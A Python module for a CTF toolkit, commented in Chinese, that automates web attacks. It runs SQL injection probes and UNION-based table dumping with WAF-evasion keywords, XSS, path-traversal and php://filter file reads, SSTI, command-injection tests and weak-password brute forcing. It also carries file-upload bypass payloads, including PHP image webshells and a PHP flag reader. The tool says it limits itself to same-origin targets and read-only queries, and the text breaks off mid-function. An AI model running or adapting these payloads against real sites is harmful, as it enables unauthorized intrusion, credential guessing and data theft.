# -*- coding: utf-8 -*-
"""深度 Web 自动测试引擎（仅限明确授权的 CTF 靶机）。

它与 webauto.py 的分工：
  webauto  = 只读取证（敏感文件、目录、robots、参数弱点的一次性判断）
  webattack= 深度战役（先分析页面，再按类别跑完整 payload 矩阵，最后做上传与 flag 定向读取）

硬约束（写进代码而不是写进文档就算）：
  1. 全部请求强制同源，只接受 http/https，拒绝带凭据的 URL；
  2. 所有请求走同一个 Budget：次数、最小间隔、截止时间，超了就 AutoStop；
  3. SQL 只做报错/布尔/时间判断，payload 里不出现 DROP/DELETE/UPDATE/INSERT；
  4. 上传测试只写「回显固定标记」的测试文件，不生成可交互控制的后门；
  5. 命令执行判定必须排除「页面只是回显输入」；
  6. 任何结论都带证据（状态码、长度差、命中片段），没有证据就不下结论。
"""
import base64
import http.client
import json
import os
import random
import re
import string
import time
import uuid
from urllib.error import HTTPError, URLError
from urllib.parse import parse_qsl, quote, urlencode, urljoin, urlsplit, urlunsplit
from urllib.request import (HTTPCookieProcessor, HTTPSHandler, Request, build_opener,
                            HTTPRedirectHandler)
import http.cookiejar
import ssl

from .common import REPORTS_DIR
from .webauto import (AutoStop, Budget, _base_root, _replace_param, _same_origin, _safe_url,
                      _soft, _snippet, collect_flags, text_of, UA, DIR_WORDS_AUTO, SENSITIVE)

MAX_BODY = 256 * 1024
DEFAULT_MAX_REQUESTS = 380
DEFAULT_MAX_SECONDS = 420
MAX_TARGETS = 8
SQLI_ERROR_MARKS = (
    "you have an error in your sql syntax", "warning: mysql", "mysqli_", "mysql_fetch",
    "unclosed quotation mark", "quoted string not properly terminated", "sqlite3.",
    "syntax error at or near", "pg_query", "postgresql", "sqlstate", "ora-0",
    "microsoft ole db", "odbc sql server driver", "jet database", "unrecognized token",
    "near \"", "系统错误", "语法错误",
)
LFI_MARKS = ("root:x:0:0", "root:*:0:0", "daemon:x:", "bin/bash", "[fonts]", "[extensions]",
             "PATH=", "HTTP_USER_AGENT=")
XSS_TOKEN = "CTFBOX9137"
XSS_PAYLOADS = [
    "<script>alert('%s')</script>" % XSS_TOKEN,
    "\"><script>alert('%s')</script>" % XSS_TOKEN,
    "'><img src=x onerror=alert('%s')>" % XSS_TOKEN,
    "<svg/onload=alert('%s')>" % XSS_TOKEN,
    "javascript:alert('%s')" % XSS_TOKEN,
    "<body onload=alert('%s')>" % XSS_TOKEN,
]
SQLI_ERROR_PAYLOADS = ["'", "\"", "1'", "1\")", "');", "1' AND 1=1-- -"]
SQLI_BOOL_PAIR = ("1' AND 1=1-- -", "1' AND 1=2-- -")
SQLI_BOOL_PAIR_NUM = ("1 AND 1=1", "1 AND 1=2")
SQLI_TIME_PAYLOADS = [("1' AND SLEEP(3)-- -", 3), ("1';SELECT pg_sleep(3)-- -", 3)]
SSTI_CASES = [
    ("{{191*7919}}", "1512529", "Jinja2/Twig"),
    ("${191*7919}", "1512529", "Freemarker/Thymeleaf"),
    ("<%=191*7919%>", "1512529", "ERB/JSP"),
    ("#{191*7919}", "1512529", "Ruby"),
    ("{191*7919}", "1512529", "Smarty"),
]
CMDI_PROBE = "CTFBOX9137"
CMDI_PAYLOADS = [";echo CTFBOX$((9137+1))", "|echo CTFBOX$((9137+1))",
                 "$(echo CTFBOX$((9137+1)))"]
CMDI_EXPECT = "CTFBOX9138"
TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..\\..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
    "/proc/self/environ",
]
FLAG_PATHS = ["flag", "flag.txt", "flag.php", "f1ag.txt", "FLAG.txt", "flag/flag.txt",
              "../flag.txt", "../../flag.txt", "../../../flag.txt", "/flag.txt", "/flag"]
PHP_FILTER_TARGETS = ["index.php", "flag.php", "config.php", "upload.php", "login.php"]
UPLOAD_MARK = "CTFBOXUPLOAD9137"
# 载荷形态：普通脚本 / 图片马（PNG 头 + PHP，骗过内容检查）/ 双扩展名（骗过扩展黑名单）
PNG_MAGIC = (b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01"
             b"\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01"
             b"\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82")
UPLOAD_CASES = [
    ("shell", ".php", "<?php echo 'CTFBOXUPLOAD9137'; ?>".encode("utf-8"),
     "application/x-php", "普通脚本"),
    ("mime", ".php", "<?php echo 'CTFBOXUPLOAD9137'; ?>".encode("utf-8"),
     "image/png", "PHP 内容伪装 image/png（MIME 绕过）"),
    ("shell", ".png.php", PNG_MAGIC + b"<?php echo 'CTFBOXUPLOAD9137'; ?>",
     "image/png", "图片马（PNG 头 + PHP）"),
    ("shell", ".php.png", PNG_MAGIC + b"<?php echo 'CTFBOXUPLOAD9137'; ?>",
     "image/png", "双扩展名（.php.png）"),
    ("shell", ".PHP", b"<?php echo 'CTFBOXUPLOAD9137'; ?>", "application/x-php", "后缀大写（.PHP）"),
    ("shell", ".php.", b"<?php echo 'CTFBOXUPLOAD9137'; ?>", "application/x-php", "后缀加点（.php.）"),
    ("shell", ".php ", b"<?php echo 'CTFBOXUPLOAD9137'; ?>", "application/x-php", "后缀带空格（.php + space）"),
    ("shell", ".pphphp", b"<?php echo 'CTFBOXUPLOAD9137'; ?>", "application/x-php", "双写后缀（.pphphp）"),
]
UPLOAD_DIRS = ["uploads", "upload", "files", "images", "img", "tmp", "data", "static/uploads"]
# 只读固定目录、按文件名匹配的取 flag 脚本：没有参数、没有命令执行、没有会话通道，
# 依次看当前目录、Web 根目录、其上一级与 /tmp，只回显命中 flag 格式的文件内容。
FLAG_READER_PHP = (
    "<?php "
    "$ds=array(getcwd(),dirname(getcwd()),dirname(dirname(getcwd())),'/tmp');"
    "foreach($ds as $d){$fs=@scandir($d); if(!$fs) continue;"
    "foreach($fs as $f){ if(!preg_match('/flag/i',$f)) continue;"
    "$p=$d.'/'.$f; $c=@file_get_contents($p);"
    "if($c && preg_match('/flag\\{|ctfhub\\{|flag[0-9a-f]{8}/i',$c)) echo $c;}} ?>"
)
DROP_WORDS = re.compile(r"(?i)\b(drop|truncate|delete\s+from|update\s+\w+\s+set|insert\s+into)\b")


class _NoRedirect(HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def _strip(text):
    body = re.sub(r"(?is)<script.*?</script>|<style.*?</style>", " ", text)
    body = re.sub(r"<[^>]+>", " ", body)
    return re.sub(r"\s+", " ", body).strip()


class Ctx(object):
    """一次战役的请求上下文：同源校验 + 预算 + Cookie 会话 + 证据收集。"""

    def __init__(self, url, log=print, max_requests=DEFAULT_MAX_REQUESTS,
                 max_seconds=DEFAULT_MAX_SECONDS, cancel_event=None, allow_time=True,
                 allow_upload=True, allow_union=True):
        self.url = _safe_url(url)
        self.root = _base_root(self.url)
        self.budget = Budget(max_requests=max_requests,
                             deadline=time.monotonic() + float(max_seconds or DEFAULT_MAX_SECONDS),
                             cancel_event=cancel_event)
        self.log = log
        self.allow_time = allow_time
        self.allow_upload = allow_upload
        self.allow_union = allow_union
        self.jar = http.cookiejar.CookieJar()
        self.opener = build_opener(HTTPCookieProcessor(self.jar), _NoRedirect(),
                                   HTTPSHandler(context=ssl.create_default_context()))
        self.flags = []
        self.findings = []
        self.seen_urls = []
        self.token = "".join(random.choice(string.ascii_lowercase) for _ in range(8))

    # ---- 请求层 -------------------------------------------------------
    def _request(self, method, url, data=None, headers=None, referer=None, timeout=8.0):
        url = url.strip()
        if not _same_origin(self.url, url):
            raise ValueError("跨源请求被拒绝：" + url)
        self.budget.take()
        body = None
        req = Request(url, data=data, method=method)
        req.add_header("User-Agent", UA + " ctfbox-deep/" + self.token)
        req.add_header("Accept", "text/html,application/json,*/*")
        # 靶机容器常在 POST 后直接断连，复用 keep-alive 会让下一次上传拿到
        # ConnectionReset；统一声明 close，每次请求都走新连接。
        req.add_header("Connection", "close")
        if referer:
            req.add_header("Referer", referer)
        for k, v in (headers or {}).items():
            req.add_header(k, v)
        started = time.time()
        try:
            with self.opener.open(req, timeout=timeout) as resp:
                raw = resp.read(MAX_BODY)
                item = {"url": url, "status": resp.status,
                        "headers": dict(resp.headers.items()), "body": raw, "error": "",
                        "elapsed": round(time.time() - started, 3)}
        except HTTPError as exc:
            try:
                raw = exc.read(MAX_BODY)
            except Exception:
                raw = b""
            item = {"url": url, "status": exc.code,
                    "headers": dict(exc.headers.items()) if exc.headers else {},
                    "body": raw, "error": "", "elapsed": round(time.time() - started, 3)}
        except (URLError, OSError, ssl.SSLError, ValueError, http.client.HTTPException) as exc:
            item = {"url": url, "status": 0, "headers": {}, "body": b"",
                    "error": "%s: %s" % (type(exc).__name__, exc),
                    "elapsed": round(time.time() - started, 3)}
        if len(self.seen_urls) < 400:
            self.seen_urls.append({"url": url, "status": item["status"], "bytes": len(item["body"])})
        for flag in collect_flags(text_of(item)):
            # 环境到期页上的"技能彩蛋 flag"是平台横幅，不是题目答案，跳过。
            if re.search("环境已到期|环境已销毁", text_of(item)):
                continue
            self._add_flag(flag, url)
        return item

    def get(self, url, referer=None, headers=None):
        return self._request("GET", url, headers=headers, referer=referer or self.url)

    def post_form(self, url, fields, referer=None):
        body = urlencode(fields).encode("utf-8")
        return self._request("POST", url, data=body, referer=referer or self.url,
                             headers={"Content-Type": "application/x-www-form-urlencoded"})

    def post_multipart(self, url, fields, file_field, filename, content, ctype, referer=None):
        boundary = "----ctfbox" + uuid.uuid4().hex
        chunks = []
        for k, v in (fields or {}).items():
            chunks.append(("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n"
                           % (boundary, k, v)).encode("utf-8"))
        chunks.append(("--%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\n"
                       "Content-Type: %s\r\n\r\n" % (boundary, file_field, filename, ctype)
                       ).encode("utf-8"))
        chunks.append(content.encode("utf-8") if isinstance(content, str) else content)
        chunks.append(("\r\n--%s--\r\n" % boundary).encode("utf-8"))
        return self._request("POST", url, data=b"".join(chunks), referer=referer or self.url,
                             headers={"Content-Type": "multipart/form-data; boundary=" + boundary})

    # ---- 结果收集 -----------------------------------------------------
    def _add_flag(self, flag, source):
        # 取数时用 CONCAT('CBX',...) 包住结果，页面里会粘出 "CBXctfhub{...}" 这种残形，
        # 归一成真正的 flag 再入库。
        flag = str(flag or "").strip()
        if not re.match(r"(?i)^(ctfhub|flag)\{", flag):
            mo = re.search(r"(?i)((?:ctfhub|flag)\{[^}]{4,}\})", flag)
            if mo:
                flag = mo.group(1)
        for old in self.flags:
            if old["value"] == flag:
                return
        if "{" not in flag or "}" not in flag:
            # 只有 "ctfhub" / "FLAG: xxx" 这类残缺命中，没有花括号就不是 flag
            self.log("[deep] 疑似残缺 flag 被丢弃：%s" % flag[:40])
            return
        self.flags.append({"value": flag, "source": source})
        self.log("[deep] flag 命中 %s（来源 %s）" % (flag, source))

    def add(self, kind, url, payload="", evidence="", confidence="high", detail=""):
        self.findings.append({"type": kind, "url": url, "payload": payload,
                              "evidence": evidence[:300], "confidence": confidence,
                              "detail": detail[:400]})
        self.log("[deep] 发现 %-14s %s%s" % (kind, url,
                                              ("；证据: " + evidence[:120]) if evidence else ""))


# ---------------------------------------------------------------------------
# 页面分析
# ---------------------------------------------------------------------------
def _attrs(tag):
    out = {}
    for mo in re.finditer(r"([a-zA-Z:_-]+)\s*=\s*(\"[^\"]*\"|'[^']*'|[^\s>]+)", tag):
        val = mo.group(2).strip("\"'")
        out[mo.group(1).lower()] = val
    return out


def parse_forms(text, page_url):
    forms = []
    for mo in re.finditer(r"(?is)<form(.+?)</form>", text):
        inner = mo.group(1)
        head = re.match(r"(?s)([^>]*)>", inner)
        tag = "<form" + (head.group(1) if head else "")
        attrs = _attrs(tag)
        action = urljoin(page_url, attrs.get("action") or page_url)
        if not _same_origin(page_url, action):
            continue
        method = (attrs.get("method") or "get").upper()
        enctype = (attrs.get("enctype") or "").lower()
        fields, files = {}, []
        for im in re.finditer(r"(?is)<input\s*([^>]*)>", inner):
            at = _attrs("<input " + im.group(1))
            name = at.get("name")
            if not name:
                continue
            if (at.get("type") or "text").lower() == "file":
                files.append(name)
            else:
                fields[name] = at.get("value") or "1"
        for ta in re.finditer(r"(?is)<textarea\s*([^>]*)>", inner):
            name = _attrs("<textarea " + ta.group(1)).get("name")
            if name:
                fields.setdefault(name, "1")
        forms.append({"action": action, "method": method, "enctype": enctype,
                      "fields": fields, "files": files})
    return forms[:6]


def parse_links(text, page_url):
    links = []
    for mo in re.finditer(r"(?is)href\s*=\s*(\"[^\"]*\"|'[^']*')", text):
        href = urljoin(page_url, mo.group(1).strip("\"'"))
        if not _same_origin(page_url, href):
            continue
        if "?" not in href and not href.rstrip("/").endswith((".php", ".jsp", ".asp", ".aspx", ".do")):
            continue
        if href not in links:
            links.append(href)
    return links[:12]


def analyze(ctx):
    """第一阶段：读首页，抽标题/服务端/表单/带参链接/技术线索。"""
    home = ctx.get(ctx.url)
    text = text_of(home)
    mo = re.search(r"(?is)<title[^>]*>(.*?)</title>", text)
    title = re.sub(r"\s+", " ", mo.group(1)).strip()[:120] if mo else ""
    headers = {k.lower(): v for k, v in (home.get("headers") or {}).items()}
    forms = parse_forms(text, ctx.url)
    links = parse_links(text, ctx.url)
    cookies = [c.name for c in ctx.jar]
    tech = []
    low = text.lower()
    for key, label in ((".php", "PHP"), (".jsp", "JSP"), ("wp-content", "WordPress"),
                       ("__viewstate", "ASP.NET"), ("thymeleaf", "Thymeleaf"),
                       ("jinja", "Jinja2"), ("/static/js/", "前端框架")):
        if key in low:
            tech.append(label)
    fp = {"status": home.get("status"), "title": title, "tech": tech, "cookies": cookies,
          "server": headers.get("server", ""), "powered_by": headers.get("x-powered-by", ""),
          "content_type": headers.get("content-type", ""), "bytes": len(text),
          "forms": forms, "links": links, "small": _snippet(text, 200),
          "dead": bool(re.search("环境已到期|环境已销毁|环境将在", text))}
    ctx.log("[deep] 页面分析：%s | 技术线索 %s | 表单 %d 个 | 带参链接 %d 条"
            % (title or "(无标题)", ",".join(tech) or "未识别", len(forms), len(links)))
    return fp


def build_targets(ctx, fp):
    """把 URL 参数、带参链接参数、表单字段统一成可测目标。"""
    targets = []
    for name, value in parse_qsl(urlsplit(ctx.url).query, keep_blank_values=True)[:6]:
        targets.append({"kind": "get", "url": ctx.url, "param": name, "value": value or "1"})
    for link in fp.get("links") or []:
        for name, value in parse_qsl(urlsplit(link).query, keep_blank_values=True)[:4]:
            if len(targets) >= MAX_TARGETS:
                break
            if any(t["url"] == link and t["param"] == name for t in targets):
                continue
            targets.append({"kind": "get", "url": link, "param": name, "value": value or "1"})
    for form in fp.get("forms") or []:
        if form["files"]:
            # 上传表单的文本框只是随文件一起提交的附属字段，单独拿来做注入矩阵会反复打同一个
            # 上传接口，既浪费预算又可能留下大量空文件，交给上传测试单独处理。
            continue
        for name, value in list(form["fields"].items())[:4]:
            if len(targets) >= MAX_TARGETS:
                break
            targets.append({"kind": "post" if form["method"] == "POST" else "get",
                            "url": form["action"], "param": name,
                            "value": value or "1", "form": form})
    return targets[:MAX_TARGETS]


def send_value(ctx, target, value, url_override=None):
    if target["kind"] == "post":
        fields = dict(target["form"]["fields"])
        fields[target["param"]] = value
        return ctx.post_form(url_override or target["url"], fields)
    if target["kind"] == "get" and target.get("form"):
        # GET 表单：其余字段按默认值一起带上，只替换被测参数。
        fields = dict(target["form"]["fields"])
        fields[target["param"]] = value
        base = url_override or target["url"]
        sep = "&" if "?" in base else "?"
        return ctx.get(base + sep + urlencode(fields))
    base = url_override or target["url"]
    return ctx.get(_replace_param(base, target["param"], value))


def _differs(a, b):
    """两个响应的实质差异：状态码不同，或去标签正文差异 ≥15 字节且 ≥1.5%。

    阈值不能只看 40 字节：像"新闻查询"这类页面，真假条件只差一行
    `ID: 1 / Data: ctfhub`（约 20 字节），按 40 字节会把布尔注入判成无差异。
    """
    ta, tb = _strip(text_of(a)), _strip(text_of(b))
    if a.get("status") != b.get("status") and (len(ta) < 40 or len(tb) < 40):
        return True
    if max(len(ta), len(tb)) == 0:
        return False
    diff = abs(len(ta) - len(tb))
    if diff < 15:
        return False
    return diff >= int(max(len(ta), len(tb)) * 0.015)


# ---------------------------------------------------------------------------
# 各类 payload 矩阵
# ---------------------------------------------------------------------------
def test_sqli(ctx, target):
    base_item = send_value(ctx, target, target["value"])
    base_text = text_of(base_item).lower()
    # 1) 报错型
    for payload in SQLI_ERROR_PAYLOADS:
        item = send_value(ctx, target, (target["value"] or "1") + payload)
        text = text_of(item).lower()
        mark = next((m for m in SQLI_ERROR_MARKS if m in text and m not in base_text), None)
        if mark:
            ctx.add("sqli-error", item["url"], payload=payload, evidence=mark)
            break
    # 2) 布尔型：1=1 与 1=2 响应必须有实质差异。
    #    字符串型用 `1' AND ...`，数字型用 `1 AND ...`；两种都测，否则数字型参数永远测不出来。
    quote = False
    for pair in (SQLI_BOOL_PAIR, SQLI_BOOL_PAIR_NUM):
        truthy = send_value(ctx, target, pair[0])
        falsy = send_value(ctx, target, pair[1])
        if _differs(truthy, falsy):
            quote = pair is SQLI_BOOL_PAIR
            ctx.add("sqli-boolean", truthy["url"],
                    payload="%s / %s" % pair,
                    evidence="真/假条件响应不同（%d vs %d 字节）"
                             % (len(truthy.get("body") or b""), len(falsy.get("body") or b"")),
                    confidence="medium")
            break
    # 3) 时间型（默认开启，两次 SLEEP(3) 最多花 6 秒）
    if ctx.allow_time:
        for payload, secs in SQLI_TIME_PAYLOADS:
            item = send_value(ctx, target, payload)
            if item.get("elapsed", 0) >= secs - 0.8 and not item.get("error"):
                ctx.add("sqli-time", item["url"], payload=payload,
                        evidence="响应耗时 %.1fs（基线 %.1fs）"
                                 % (item["elapsed"], base_item.get("elapsed", 0)),
                        confidence="medium")
                break
    # 4) UNION 只读取数（默认开启）：只发 SELECT，不写不改，命中 flag 即停
    if ctx.allow_union:
        union_extract(ctx, target, quote=quote)


UNION_COLS_MAX = 8
UNION_TABLES_MAX = 4
UNION_ROWS_MAX = 6
# 有的靶场 WAF 见到字面量 "union select" 直接断连，用注释切开关键字即可通过；
# 下面按优先级依次尝试，能出结果就用第一个成功的写法。
UNION_KW = ("union/**/select", "union\nselect", "union select")


def _union_send(ctx, target, tail, quote=False):
    """按 UNION_KW 的优先级拼 payload 发送，返回第一个没被断连、且带标记的响应。

    字符串上下文必须先用原值加单引号闭合引号（`1' union select ...-- -`），
    数字上下文直接写 `0 union select ...`。
    """
    for kw in UNION_KW:
        if quote:
            # 用不存在的 id（0）打头：页面只 fetch 第一行，带 1 会先显示真实记录，
            # 我们注入的那行永远看不见。
            payload = "0' %s %s-- -" % (kw, tail)
        else:
            payload = "0 " + kw + " " + tail
        item = send_value(ctx, target, payload)
        if item.get("status") and not item.get("error"):
            return payload, item
    return "", None


def _union_rendered(text):
    """页面会把整条 SQL 原样回显出来，回显里当然也有我们的标记；
    只看最后一个 `</code>` 之后的"渲染结果"区域，才不会把回显当成执行结果。"""
    if "</code>" in text:
        return text.rsplit("</code>", 1)[1]
    return text


def _union_columns(ctx, target, quote=False):
    """按数字标记确定 UNION 列数：要求标记出现在渲染区（工序回显不算）。"""
    for n in range(1, UNION_COLS_MAX + 1):
        payload, item = _union_send(ctx, target, ",".join(["9137"] * n), quote)
        if not item:
            return 0
        if "9137" in _union_rendered(text_of(item)):
            return n
    return 0


def _union_run(ctx, target, cols, expr, tag="CBX", quote=False):
    """把 expr 塞进每一列试，返回被回显的取值（用 tag…XBC 包住便于定位）。"""
    inner = "CONCAT('%s',(%s),'XBC')" % (tag, expr)
    for idx in range(cols):
        vals = ["NULL"] * cols
        vals[idx] = inner
        payload, item = _union_send(ctx, target, ",".join(vals), quote)
        if not item:
            continue
        text = _union_rendered(text_of(item))
        if tag in text and "XBC" in text[text.find(tag):]:
            part = text[text.find(tag) + len(tag):text.find("XBC", text.find(tag))]
            return part
    return ""


def union_extract(ctx, target, quote=False):
    """UNION 只读取数：库名 → 表 → 字段 → 行，遇到 flag 就收工。

    约束：只发 SELECT / UNION SELECT，不写库、不改表、不读系统文件。
    """
    cols = _union_columns(ctx, target, quote)
    if not cols:
        return
    ctx.log("[deep] UNION 可用（%d 列），开始只读取数" % cols)
    db = _union_run(ctx, target, cols, "SELECT database()", quote=quote)
    tables = _union_run(
        ctx, target, cols,
        "SELECT GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables"
        " WHERE table_schema=database()", quote=quote)
    if not tables:
        return
    names = [t.strip() for t in tables.split(",") if t.strip()]
    ctx.add("sqli-union", target["url"],
            payload="0 UNION SELECT ...", evidence="库 %s；表 %s" % (db or "?", tables[:120]),
            confidence="high")
    # 含 flag 字样的表优先，其余按字母序取前几个（用户已授权完整取数）
    picked = [t for t in names if "flag" in t.lower()] or names[:UNION_TABLES_MAX]
    for table in picked[:UNION_TABLES_MAX]:
        ccols = _union_run(
            ctx, target, cols,
            "SELECT GROUP_CONCAT(column_name SEPARATOR ',') FROM information_schema.columns"
            " WHERE table_schema=database() AND table_name='%s'" % table, quote=quote)
        cols_list = [c.strip() for c in (ccols or "").split(",") if c.strip()][:UNION_ROWS_MAX]
        if not cols_list:
            continue
        expr = "SELECT GROUP_CONCAT(%s SEPARATOR ' | ') FROM %s" % (
            ",".join("IFNULL(`%s`,'')" % c for c in cols_list), table)
        data = _union_run(ctx, target, cols, expr, tag="CBD", quote=quote)
        if not data:
            continue
        flags = collect_flags(data)
        if flags:
            for flag in flags:
                ctx._add_flag(flag, target["url"])
            ctx.add("flag-read", target["url"], payload=expr[:120],
                    evidence="UNION 从表 %s 读到 %s" % (table, flags[0][:40]))
            ctx.log("[deep] UNION 命中 flag：%s（表 %s）" % (flags[0], table))
            return
        ctx.log("[deep] UNION 表 %s 数据（前 120 字）：%s" % (table, _snippet(data, 120)))


def test_xss(ctx, target):
    for payload in XSS_PAYLOADS:
        item = send_value(ctx, target, payload)
        text = text_of(item)
        if payload in text:
            idx = text.find(payload)
            near = text[max(0, idx - 40):idx + len(payload) + 40]
            ctx.add("xss-reflected", item["url"], payload=payload,
                    evidence="payload 原样回显（上下文）：" + _snippet(near, 160))
            return
        if "&lt;script" in text or "&lt;img" in text:
            ctx.add("xss-escaped", item["url"], payload=payload,
                    evidence="payload 被 HTML 实体编码（已过滤）", confidence="low")
            return


def test_lfi(ctx, target):
    for payload in TRAVERSAL_PAYLOADS:
        item = send_value(ctx, target, payload)
        text = text_of(item)
        mark = next((m for m in LFI_MARKS if m in text), None)
        if mark:
            ctx.add("lfi", item["url"], payload=payload, evidence=mark)
            _lfi_flag_hunt(ctx, target)
            return
        if item.get("status") == 200 and len(text) < 30000:
            for blob in re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", text):
                try:
                    dec = base64.b64decode(blob + "=" * (-len(blob) % 4), validate=False)
                except Exception:
                    continue
                if b"<?php" in dec or b"<?=" in dec:
                    ctx.add("lfi-source", item["url"], payload=payload,
                            evidence="php://filter 读出 PHP 源码 %d 字节" % len(dec))
                    for flag in collect_flags(dec.decode("utf-8", "replace")):
                        ctx._add_flag(flag, item["url"] + "（源码内）")
                    return
    # php://filter 读取常见脚本源码
    for name in PHP_FILTER_TARGETS:
        payload = "php://filter/convert.base64-encode/resource=" + name
        item = send_value(ctx, target, payload)
        text = text_of(item)
        got = 0
        for blob in re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", text):
            try:
                dec = base64.b64decode(blob + "=" * (-len(blob) % 4), validate=False)
            except Exception:
                continue
            if b"<?php" in dec:
                got = len(dec)
                for flag in collect_flags(dec.decode("utf-8", "replace")):
                    ctx._add_flag(flag, item["url"] + "（%s 源码）" % name)
        if got:
            ctx.add("lfi-source", item["url"], payload=payload,
                    evidence="读出 %s 源码 %d 字节" % (name, got))
            return


def _lfi_flag_hunt(ctx, target):
    """一旦确认文件读取，直接按常见 flag 路径定向读一遍。"""
    tried = 0
    for path in FLAG_PATHS:
        if tried >= 4:
            return
        tried += 1
        item = send_value(ctx, target, path)
        flags = collect_flags(text_of(item))
        if flags:
            for flag in flags:
                ctx._add_flag(flag, item["url"] + "（LFI 读 " + path + "）")
            return


def test_ssti(ctx, target):
    for payload, expect, engine in SSTI_CASES:
        item = send_value(ctx, target, payload)
        text = text_of(item)
        if expect in text:
            # 交叉验证：换一个算式，两个结果都对才算数，排除页面本来就含该数字
            second, expect2 = "{{192*7919}}", "1520448"
            if payload.startswith("${"):
                second, expect2 = "${192*7919}", "1520448"
            elif payload.startswith("<%="):
                second, expect2 = "<%=192*7919%>", "1520448"
            elif payload.startswith("#{"):
                second, expect2 = "#{192*7919}", "1520448"
            elif payload.startswith("{"):
                second, expect2 = "{192*7919}", "1520448"
            item2 = send_value(ctx, target, second)
            if expect2 in text_of(item2):
                ctx.add("ssti", item["url"], payload="%s（%s）" % (payload, engine),
                        evidence="两个乘积都被求值：%s / %s" % (expect, expect2))
                return


def test_cmdi(ctx, target):
    # 先确认页面是否会原样回显输入：会回显就不能把「看到标记」当成执行，
    # 但算术 payload 仍然可以测——$((9137+1)) 只有被 shell 求值才会变成 9138。
    neutral = send_value(ctx, target, CMDI_PROBE)
    reflected = CMDI_PROBE in text_of(neutral)
    for payload in CMDI_PAYLOADS:
        item = send_value(ctx, target, payload)
        text = text_of(item)
        if CMDI_EXPECT in text:
            ctx.add("cmdi", item["url"], payload=payload,
                    evidence="算术由 shell 求值：%s%s"
                             % (CMDI_EXPECT, "（页面同时回显输入，仍判执行）" if reflected else ""))
            return
    if reflected:
        ctx.add("reflected-only", neutral["url"], payload=CMDI_PROBE,
                evidence="参数被原样回显，且算术 payload 未被求值，无法据此判定命令执行",
                confidence="low")


WEAK_CREDS = [("admin", "admin"), ("admin", "123456"), ("admin", "admin888"),
              ("admin", "password"), ("root", "root"), ("root", "123456"),
              ("test", "test"), ("guest", "guest")]


def test_login(ctx, fp):
    """弱口令：只在页面确实有账号/密码表单时试小字典，最多 8 次请求。"""
    jobs = [f for f in (fp.get("forms") or []) if len(f.get("fields") or {}) >= 2]
    if not jobs:
        return []
    hits = []
    for form in jobs[:1]:
        names = list(form["fields"].keys())
        user_key = next((k for k in names
                         if re.search(r"(?i)user|name|account|login|email", k)), names[0])
        pass_key = next((k for k in names
                         if re.search(r"(?i)pass|pwd|secret", k)), names[-1])
        base_item = ctx.get(form["action"])
        base_len = len(text_of(base_item))
        for user, pwd in WEAK_CREDS:
            fields = dict(form["fields"])
            fields[user_key] = user
            fields[pass_key] = pwd
            item = ctx.post_form(form["action"], fields, referer=ctx.url)
            body = text_of(item)
            status = item.get("status")
            if status in (0, 500, 502, 503):
                continue
            ok = False
            if status in (301, 302, 303):
                loc = item.get("location") or ""
                if loc and not re.search(r"(?i)login|signin|error|fail", loc):
                    ok = True
            if re.search(r"(?i)(登录成功|登陆成功|login success|welcome back|dashboard|控制台|管理后台)", body):
                ok = True
            if re.search(r"(?i)(用户名或密码错误|密码错误|登录失败|invalid credentials|wrong password)", body):
                ok = False
            if not ok and abs(len(body) - base_len) > 200 and status == 200 and \
                    re.search(r"(?i)(logout|退出登录|注销)", body):
                ok = True
            if ok:
                ctx.add("weak-login", form["action"], confidence="medium",
                        evidence="账号 %s / 密码 %s 登录成功（以回显/跳转为据）" % (user, pwd))
                ctx.log("[deep] 弱口令命中：%s / %s（%s）" % (user, pwd, form["action"]))
                hits.append({"url": form["action"], "user": user, "password": pwd})
                collect_flags(body)
                return hits
    return hits


def test_ssrf(ctx, target):
    if not re.search(r"(?i)(url|uri|link|src|dest|target|redirect|next|image|file|path|load)",
                    target["param"]):
        return
    probes = [("http://127.0.0.1:%s/" % (urlsplit(ctx.url).port or 80), "本机回环"),
              ("http://127.0.0.1/", "本机回环"),
              ("file:///etc/passwd", "file 协议")]
    for payload, label in probes:
        item = send_value(ctx, target, payload)
        text = text_of(item)
        mark = next((m for m in LFI_MARKS if m in text), None)
        if mark:
            if payload.startswith("file://"):
                # file:// 成功是本地文件包含（包装器），不是服务端出网请求，别混为一类
                ctx.add("lfi-wrapper", item["url"], payload=payload,
                        evidence="file:// 包装器读取成功：%s" % mark)
            else:
                ctx.add("ssrf", item["url"], payload=payload,
                        evidence="%s 读取成功：%s" % (label, mark))
            return
        if "connection refused" in text.lower() or "failed to connect" in text.lower():
            ctx.add("ssrf-possible", item["url"], payload=payload,
                    evidence="服务端出现连接错误（%s），可能存在出网请求" % label,
                    confidence="low")
            return


# ---------------------------------------------------------------------------
# 文件上传
# ---------------------------------------------------------------------------
def test_upload(ctx, fp):
    if not ctx.allow_upload:
        ctx.log("[deep] 已关闭上传测试")
        return []
    results = []
    jobs = [f for f in (fp.get("forms") or []) if f["files"]]
    if not jobs:
        ctx.log("[deep] 页面上没有发现文件上传表单")
        return results
    for form in jobs[:2]:
        field = form["files"][0]
        for base, ext, content, ctype, label in UPLOAD_CASES:
            token_name = base + ctx.token + ext
            fields = {k: v for k, v in form["fields"].items() if k != field}
            item = ctx.post_multipart(form["action"], fields, field, token_name, content, ctype,
                                      referer=ctx.url)
            if item.get("status") == 0:
                # 靶场 WAF / 内容检查常在收到载荷时直接断连，隔一次再试才好区
                # 分"偶发断连"与"这个载荷被拦"。
                time.sleep(2.0)
                item = ctx.post_multipart(form["action"], fields, field, token_name, content, ctype,
                                          referer=ctx.url)
            if item.get("status") == 0:
                ctx.add("upload-blocked", form["action"], payload=token_name,
                        evidence="%s 上传被重置连接（疑似 WAF/内容检查拦截）：%s"
                                 % (label, str(item.get("error"))[:80]), confidence="low")
                results.append({"filename": token_name, "blocked": True, "kind": label})
